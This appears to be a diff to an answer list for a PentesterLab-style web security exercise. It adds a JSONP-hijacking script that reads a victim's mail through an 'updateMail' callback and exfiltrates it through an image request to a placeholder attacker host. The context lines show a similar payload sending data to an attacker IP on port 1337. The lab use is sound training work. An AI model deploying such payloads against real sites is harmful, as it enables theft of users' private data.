@@ -14,6 +14,13 @@
   - |
     <script>
       function updateMail(mail_ary){
+        document.write("<img src='http://myhomepage.#PENTESTLAB-DOMAIN#/attacker?mail="+JSON.stringify(mail_ary)+"' />");
+      }
+    </script>
+    <script type='text/javascript' src='http://mail.#PENTESTLAB-DOMAIN#/api/mail.cgi?jsonp=updateMail'></script>
+  - |
+    <script>
+      function updateMail(mail_ary){
         document.write("<img src='http://#ATTACKER-IP#:1337/"+JSON.stringify(mail_ary)+"' />");
       }
     </script>
